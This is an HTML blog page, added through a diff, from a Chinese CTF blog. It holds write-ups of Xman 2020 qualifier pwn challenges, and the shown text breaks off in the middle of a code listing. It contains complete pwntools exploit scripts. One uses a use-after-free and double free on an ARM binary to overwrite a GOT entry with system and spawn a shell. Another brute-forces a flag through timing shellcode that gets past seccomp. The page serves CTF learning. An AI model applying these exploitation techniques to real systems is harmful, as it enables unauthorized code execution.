@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.9.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>标签: shellcode - Mask&#39;s blogs</title>
+
+
+    <meta name="description" content="a newbie in CTF">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Mask&#39;s blogs">
+<meta property="og:url" content="Mask6asok.github.io/tags/shellcode/index.html">
+<meta property="og:site_name" content="Mask&#39;s blogs">
+<meta property="og:description" content="a newbie in CTF">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="/images/og_image.png">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mask&#39;s blogs">
+<meta name="twitter:description" content="a newbie in CTF">
+<meta name="twitter:image" content="/images/og_image.png">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/github.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="Mask&#39;s blogs" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    <div class="card-content">
+        <nav class="breadcrumb" aria-label="breadcrumbs">
+        <ul>
+            <li><a href="/tags">标签</a></li>
+            <li class="is-active"><a href="#" aria-current="page">shellcode</a></li>
+        </ul>
+        </nav>
+    </div>
+</div>
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-12-22T11:57:22.029Z">2019-12-22</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    9 分钟 读完 (大约 1393 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2019/12/22/Xman2020冬令营选拔赛Pwn题解.html">Xman2020冬令营选拔赛Pwn题解</a>
+            
+        </h1>
+        <div class="content">
+            <p>这次选拔赛pwn题都还行，除了kernel没做，其他都做了，可惜考试多多，没时间去冬令营了</p>
+<h2 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h2><p>这是我第一次做arm的题目，这题目也比较友好，不过这是一道堆溢出的题目，没怎么牵扯到栈，所以暂时没去了解arm的汇编层次的结构，比如参数传递之类的，等这个寒假学习一下吧</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  arm checksec pwn  </span><br><span class="line">[*] '/home/mask/Desktop/xman/arm/pwn'</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+<p>由于这是一道arm题，所以需要使用qemu来执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./pwn</span><br></pre></td></tr></table></figure>
+<p>调试可以使用gdb附加</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./pwn -q</span><br><span class="line">	......</span><br><span class="line">	......</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote localhost:1234</span></span><br></pre></td></tr></table></figure>
+<p>常规菜单题</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  arm <span class="keyword">sh</span> <span class="keyword">run</span>.<span class="keyword">sh</span>              </span><br><span class="line">Tell me your name:</span><br><span class="line">mask</span><br><span class="line">  Welcome to IOT world </span><br><span class="line">  It's a normal <span class="keyword">note</span> boke</span><br><span class="line">  1. add a <span class="keyword">note</span></span><br><span class="line">  2. delete a <span class="keyword">note</span></span><br><span class="line">  3. <span class="keyword">print</span> a <span class="keyword">note</span></span><br><span class="line">  your choice:</span><br></pre></td></tr></table></figure>
+<p>ida打开，很容易就发现了有uaf的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+8h] [bp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v1, <span class="number">4u</span>);</span><br><span class="line">  result = atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> || result &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[result] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[result]); <span class="comment">// uaf</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Done it"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在程序的bss段可以看到name在notelist的上方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.bss:00021068                 EXPORT name</span><br><span class="line">.bss:00021068 name            % 1                     ; DATA XREF: main+40↑o</span><br><span class="line">.bss:00021068                                         ; .text:off_10AEC↑o</span><br><span class="line">.bss:00021069                 % 1</span><br><span class="line">	......</span><br><span class="line">.bss:00021088                 EXPORT notelist</span><br><span class="line">.bss:00021088 ; void *notelist[20]</span><br><span class="line">.bss:00021088 notelist        % 0x50</span><br></pre></td></tr></table></figure>
+<p>因此可以在name中伪造一个size，然后利用double free再malloc到bss这里进而控制整个notelist</p>
+<p>改写notelist为got表就可以leak libc，接着就可以写system</p>
+<p>一个多平台libc search的网站：<a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a></p>
+<p>这里直接用我本地libc来跑了</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">file = <span class="string">'./pwn'</span></span><br><span class="line">e = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">"/usr/arm-linux-gnueabihf/lib/libc.so.6"</span>)</span><br><span class="line">rlibc = <span class="string">''</span></span><br><span class="line">ip = <span class="string">''</span></span><br><span class="line">port = <span class="string">''</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(code=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> debug</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(local)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p, libc, debug</span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        <span class="comment"># p = process(["qemu-arm", "-g", "1111", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])</span></span><br><span class="line">        p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabihf"</span>, <span class="string">"./pwn"</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">        debug = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> rlibc != <span class="string">''</span>:</span><br><span class="line">            libc = ELF(rlibc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">un64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">un32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, c)</span>:</span></span><br><span class="line">    sla(<span class="string">": \n"</span>, <span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(size))</span><br><span class="line">    sea(<span class="string">":"</span>, c)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">": \n"</span>, <span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">": \n"</span>, <span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">    sla(<span class="string">": \n"</span>, <span class="string">'5'</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>, c)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">":"</span>, p32(<span class="number">0x31</span>).rjust(<span class="number">0x20</span>, <span class="string">'\x00'</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'2\n'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'2\n'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'3'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p32(<span class="number">0x21078</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'5'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p32(<span class="number">0x21078</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x28</span>, p32(e.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = un32(rn(<span class="number">4</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">edit(<span class="number">0</span>, p32(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>
+<h2 id="baby-kernel"><a href="#baby-kernel" class="headerlink" title="baby_kernel"></a>baby_kernel</h2><p>没整过，先占坑，日后补</p>
+<h2 id="NoooCall"><a href="#NoooCall" class="headerlink" title="NoooCall"></a>NoooCall</h2><p>很有意思的一道题，程序中把flag读进了内存，然后读入16个字节的shellcode</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *flag; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *shellcode; <span class="comment">// ST18_8</span></span><br><span class="line">  FILE *v6; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  sub_B91(a1, a2, a3);</span><br><span class="line">  v6 = fopen(<span class="string">"./flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  flag = mmap((<span class="keyword">void</span> *)<span class="number">0x200000000</span>LL, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  shellcode = mmap((<span class="keyword">void</span> *)<span class="number">0x300000000</span>LL, <span class="number">0x20000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  _isoc99_fscanf((__int64)v6, (__int64)<span class="string">"%s"</span>, (__int64)flag);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your Shellcode &gt;&gt;"</span>, <span class="string">"%s"</span>);</span><br><span class="line">  read(<span class="number">0</span>, shellcode, <span class="number">0x10</span>uLL);</span><br><span class="line">  seccomp_band_call();</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">void</span> *))shellcode)(<span class="number">0L</span>L, shellcode);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>seccomp_band_call函数中禁用了call指令，也就是说我不能执行系统调用了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_C34</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST00_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = seccomp_init(<span class="number">0L</span>L);</span><br><span class="line">  seccomp_load(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里利用方式有一点side channel attack的味道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,[rsp+0x18]</span><br><span class="line">movzx  eax, byte ptr [rdi+i]</span><br><span class="line">l:cmp rax,x</span><br><span class="line">jnz l</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>这一段shellcode的意思是<code>flag[i] == x</code>的比较，如果不等，则进行循环，否则返回main函数，于是可以通过程序的运行情况，来判断x是否是flag[i]，因此对flag逐位逐字节爆破，直到零字节，就可以得知flag了</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">file = <span class="string">'./chall'</span></span><br><span class="line">e = ELF(file)</span><br><span class="line">context.arch = e.arch</span><br><span class="line">libc = e.libc</span><br><span class="line">rlibc = <span class="string">''</span></span><br><span class="line">ip = <span class="string">''</span></span><br><span class="line">port = <span class="string">''</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(code=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> debug</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(local)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p, libc, debug</span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        p = process(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">        debug = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> rlibc != <span class="string">''</span>:</span><br><span class="line">            libc = ELF(rlibc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">un64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">un32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi,[rsp+0x18]</span></span><br><span class="line"><span class="string">movzx  eax, byte ptr [rdi+&#123;&#125;]</span></span><br><span class="line"><span class="string">l:cmp rax,&#123;&#125;</span></span><br><span class="line"><span class="string">jnz l</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> shellcode, flag</span><br><span class="line">    run(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code = shellcode.format(hex(len(flag)), hex(c))</span><br><span class="line">        code = asm(code)</span><br><span class="line">        sea(<span class="string">'&gt;&gt;'</span>, code + <span class="string">'\xc3'</span>)</span><br><span class="line">        p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"flag:"</span> + flag</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += chr(c)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        p.close()</span><br><span class="line">tab = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>)] + [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> tab</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tab:</span><br><span class="line">        brute(i)</span><br></pre></td></tr></table></figure>
+<h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>一道格式化字符串利用的题目，字符串存在堆里，不在栈上，不能直接任意地址写</p>
+<p>不过可以改栈上指针指向backdoor函数直接shell，爆破栈低位，几率挺大</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 